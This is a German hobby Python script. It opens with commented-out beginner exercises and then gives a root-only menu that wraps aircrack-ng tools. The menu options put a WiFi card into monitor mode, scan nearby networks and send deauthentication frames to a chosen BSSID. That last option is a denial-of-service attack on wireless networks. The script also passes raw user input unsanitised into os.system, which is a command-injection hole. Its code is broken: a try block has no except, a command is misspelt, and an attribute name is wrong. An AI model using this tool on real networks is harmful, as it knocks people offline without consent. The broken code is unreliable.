
#-*- coding: utf-8 -*-
import sys
import os
print (sys.argv)


print("Bitte dieses tool")
# Teil 1
#x = 30
#y = x < 50

#if y:
#    print("Die Variable X ist kleiner als 50")
#elif x == 50:
#    print("x=50")

#else:
#    print("X größer 50")
#print("Wert:")
#print(x)
# Teil 2
#while x <= 42:
#    print(x)
#    print("Wert nicht erreicht, erhöhen...")
#    x = x +1
#print("fertig")


#Teil 3

#z = ('Pizza','Burger','Pommes')
#for w in z:
#    print(w)

#print("Entscheide dich! :D")
#print(" ")
#print(" ")
#print(" ")
#varcmd = raw_input("Gib eine Zahl ein: ")
#try:
#    print("Du hast eingegeben: ")
#    print(varcmd)
#    if varcmd > 9:
#        print("Eine Ziffer du kek")
#except NameError:
#    print("Nicht gültiger Eingabewert")
#except:
#    print("lmao u suck")

#print(" ")
#print(" ")
#print(" ")
#print(" ")

#n = (42, 5, 10, 4 ,67 ,2 ,321)
#for t in range(0, len(n),2):
#    print(n[t])

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    #taken from https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-terminal-in-python

print(bcolors.HEADER + "Updatemechanismus "+ bcolors.ENDC + "bitte warten...")

try:
    os.system('apt-get updat && apt-get upgrade')
    os.system('apt-get install figlet toilet')
print(bcolors.WARNING + 'HINWEIS: ' + bcolors.ENDC + 'root-Privilegien sind für dieses Script erforderlich!')

if os.geteuid() != 0:
    exit("Dieses Script muss als root ausgeführt werden! Versuche es noch einmal und hänge vor den Scriptaufruf ein 'sudo'")
os.system('figlet Schnellstart')
print("Schnellstart-script nützlicher Funktionen von DasPinguin")





l = 1
while l == 1:
    print("")
    print(" "  + bcolors.OKBLUE)
    print("(1) WLAN-Interface wlan0 in Monitormodus umschalten")
    print("(2) Alle Netzwerke in der Nähe scannen")
    print("(3) Deauthentifiziere ein bestimmtest WLAN per BSSID und aireplay ")
    print("(4) Schalte WLAN0mon zurück in den Manager-Modus" + bcolors.ENDC)
    try:
        varcmd = input("Gib eine Zahl ein oder drücke Ctrl + C ein, um zu beenden : ")

        print("Du hast eingegeben: ")
        print(varcmd)
        if varcmd > 4:
            print("Eine gültige Zahl du Kek")

        elif varcmd == 1:
                os.system('airmon-ng start wlan0')
        elif varcmd == 2:
                os.system('airodump-ng wlan0mon')
        elif varcmd == 3:
            mdk3cmd = raw_input("Gib eine" + bcolors.OKGREEN + " BSSID" + bcolors.ENDC + " ein: ")
            os.system("airmon-ng stop wlan0mon")
            os.system('aireplay-ng --deauth 5 wlan0 -a' + mdk3cmd)
        elif varcmd == 4:
            os.system("airmon-ng stop wlan0mon")
    except NameError:
        print(bcolors.Fail + "Nicht gültiger Eingabewert. Erneut versuchen" + bcolors.ENDC)
    except KeyboardInterrupt:
        print(" ")
        print(bcolors.FAIL + "KeyboardInterrupt" + bcolors.ENDC + " vom Benutzer. Es wird beendet...")
        exit()
    except:
        print(bcolors.FAIL + "Beenden, da vermutlich ein Fehler aufgetreten ist. Falls mit Ctrl + D beendet wurde, ist zu bemerken, dass das Beenden mit Ctrl + C bevorzugt ist")
        exit()
